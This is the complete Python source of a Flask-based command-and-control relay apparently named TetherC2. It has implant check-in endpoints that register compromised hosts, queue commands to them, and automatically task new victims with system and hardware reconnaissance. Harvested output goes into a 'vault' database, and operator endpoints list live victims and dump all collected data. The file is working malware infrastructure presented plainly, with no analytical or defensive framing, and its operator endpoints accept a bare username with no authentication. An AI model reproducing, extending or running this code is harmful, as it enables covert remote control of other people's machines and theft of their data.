import sys
import os
import sqlite3
import json
import time
import threading
import random
from flask import Flask, request, jsonify
from werkzeug.security import generate_password_hash, check_password_hash

# --- Database Setup Class ---
class DatabaseManager:
    def __init__(self, db_file="tether_server.db"):
        self.conn = sqlite3.connect(db_file, check_same_thread=False)
        self.conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT PRIMARY KEY, password_hash TEXT NOT NULL, assigned_line INTEGER NOT NULL)")
        self.conn.execute("CREATE TABLE IF NOT EXISTS sessions (session_id TEXT PRIMARY KEY, owner_username TEXT NOT NULL, metadata TEXT, FOREIGN KEY (owner_username) REFERENCES users(username))")
        self.conn.execute("CREATE TABLE IF NOT EXISTS vault (session_id TEXT, module_name TEXT, data TEXT, PRIMARY KEY (session_id, module_name))")

    def create_user(self, username, password_hash):
        try:
            # Assign a random line from 1-10 when a new user is created
            assigned_line = random.randint(1, 10)
            self.conn.execute("INSERT INTO users (username, password_hash, assigned_line) VALUES (?, ?, ?)", (username, password_hash, assigned_line))
            self.conn.commit()
            return True
        except sqlite3.IntegrityError:
            return False # Username already exists
            
    def get_user(self, username):
        cursor = self.conn.cursor()
        cursor.execute("SELECT username, password_hash, assigned_line FROM users WHERE username = ?", (username,))
        return cursor.fetchone()

    def create_or_update_session(self, session_id, owner_username, metadata):
        self.conn.execute("INSERT OR REPLACE INTO sessions (session_id, owner_username, metadata) VALUES (?, ?, ?)", (session_id, owner_username, json.dumps(metadata)))
        self.conn.commit()
        
    def get_sessions_for_user(self, username):
        cursor = self.conn.cursor()
        cursor.execute("SELECT session_id, metadata FROM sessions WHERE owner_username = ?", (username,))
        return {row[0]: json.loads(row[1]) for row in cursor.fetchall()}

    def save_vault_data(self, session_id, module_name, data):
        self.conn.execute("INSERT OR REPLACE INTO vault (session_id, module_name, data) VALUES (?, ?, ?)", (session_id, module_name, json.dumps(data)))
        self.conn.commit()

    def load_vault_data_for_user(self, username):
        user_sessions = self.get_sessions_for_user(username)
        vault_data = {}
        for session_id, metadata in user_sessions.items():
            vault_data[session_id] = {"metadata": metadata}

        if not user_sessions: return {}
            
        session_ids_placeholder = ','.join('?' for _ in user_sessions)
        query = f"SELECT session_id, module_name, data FROM vault WHERE session_id IN ({session_ids_placeholder})"
        
        for session_id, module_name, data_json in self.conn.execute(query, tuple(user_sessions.keys())):
            if session_id in vault_data:
                vault_data[session_id][module_name] = json.loads(data_json)
        return vault_data

# --- Configuration & State ---
SESSION_TIMEOUT_SECONDS = 40
app = Flask(__name__)
db = DatabaseManager()

command_queue, response_queue, active_sessions = {}, {}, {}
cmd_lock, res_lock, ses_lock = threading.Lock(), threading.Lock(), threading.Lock()

# --- Authentication Endpoints ---
@app.route('/auth/register', methods=['POST'])
def register():
    data = request.json
    username, password = data.get('username'), data.get('password')
    if not all([username, password]) or len(password) < 4:
        return jsonify({"success": False, "error": "Username and a password (min 4 chars) are required."}), 400
    if db.create_user(username, generate_password_hash(password)):
        return jsonify({"success": True, "message": "Account created successfully."})
    else:
        return jsonify({"success": False, "error": "Username already exists."}), 409

@app.route('/auth/login', methods=['POST'])
def login():
    data = request.json
    username, password = data.get('username'), data.get('password')
    user = db.get_user(username)
    if user and check_password_hash(user[1], password):
        return jsonify({"success": True, "username": user[0], "assigned_line": user[2]})
    else:
        return jsonify({"success": False, "error": "Invalid username or password."}), 401

# --- Implant (Payload) Endpoints ---
@app.route('/implant/hello', methods=['POST'])
def handle_implant_hello():
    data = request.json
    session_id, c2_user = data.get("session_id"), data.get("c2_user")
    if not all([session_id, c2_user]): return jsonify({"error": "session_id and c2_user are required"}), 400
    
    with ses_lock:
        is_new_session = session_id not in active_sessions
        metadata = {"hostname": data.get("hostname"), "user": data.get("user"), "os": data.get("os")}
        db.create_or_update_session(session_id, c2_user, metadata)
        active_sessions[session_id] = {"owner": c2_user, "last_seen": time.time(), **metadata}
        if is_new_session: print(f"[RELAY] New session online from user '{c2_user}': {session_id}")
    
    if "results" in data:
        for result in data.get("results", []):
            module_name, output_data = result.get("command"), result.get("output")
            if module_name and output_data is not None:
                db.save_vault_data(session_id, module_name, output_data)
                with res_lock:
                    response_queue.setdefault(c2_user, {}).setdefault(session_id, []).append(result)
    
    with cmd_lock:
        if is_new_session:
            initial_tasks = [{"action": "system_info", "params": {}}, {"action": "hardware_info", "params": {}}] 
            command_queue.setdefault(c2_user, {}).setdefault(session_id, []).extend(initial_tasks)
        commands_to_execute = command_queue.get(c2_user, {}).pop(session_id, [])
        
    return jsonify({"commands": commands_to_execute})

@app.route('/implant/response', methods=['POST'])
def handle_implant_response():
    data = request.json
    session_id = data.get("session_id")
    if not session_id: return jsonify({"status": "error", "message": "session_id missing"}), 400
    owner = active_sessions.get(session_id, {}).get("owner")
    if owner:
        module_name, output_data = data.get("command"), data.get("output")
        if module_name and output_data is not None: db.save_vault_data(session_id, module_name, output_data)
        with res_lock: response_queue.setdefault(owner, {}).setdefault(session_id, []).append(data)
    return jsonify({"status": "ok"})

# --- C2 Controller (Client) Endpoints ---
@app.route('/c2/task', methods=['POST'])
def handle_c2_task():
    data = request.json; username, session_id, command = data.get("username"), data.get("session_id"), data.get("command")
    if not all([username, session_id, command]): return jsonify({"status": "error", "message": "Missing params"}), 400
    with cmd_lock: command_queue.setdefault(username, {}).setdefault(session_id, []).append(command)
    return jsonify({"status": "ok"})

@app.route('/c2/discover', methods=['POST'])
def discover_sessions():
    username = request.json.get("username"); user_sessions = {}
    with ses_lock:
        for sid, data in active_sessions.items():
            if data.get("owner") == username and (time.time() - data.get("last_seen", 0)) < SESSION_TIMEOUT_SECONDS:
                user_sessions[sid] = {"hostname": data["hostname"], "user": data["user"], "os": data.get("os", "Unknown")}
    return jsonify({"sessions": user_sessions})
    
@app.route('/c2/get_responses', methods=['POST'])
def get_c2_responses():
    username, session_id = request.json.get("username"), request.json.get("session_id")
    with res_lock: responses = response_queue.get(username, {}).pop(session_id, [])
    return jsonify({"responses": responses})

@app.route('/c2/get_all_vault_data', methods=['POST'])
def get_all_vault_data():
    username = request.json.get("username")
    if not username: return jsonify({"success": False, "error": "Username is required"}), 400
    vault_data = db.load_vault_data_for_user(username)
    return jsonify({"success": True, "data": vault_data})

@app.route('/')
def index(): return "TetherC2 Relay is operational."

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5001))
    print(f"[RELAY] TetherC2 Relay is operational on port {port}.")
    app.run(host='0.0.0.0', port=port)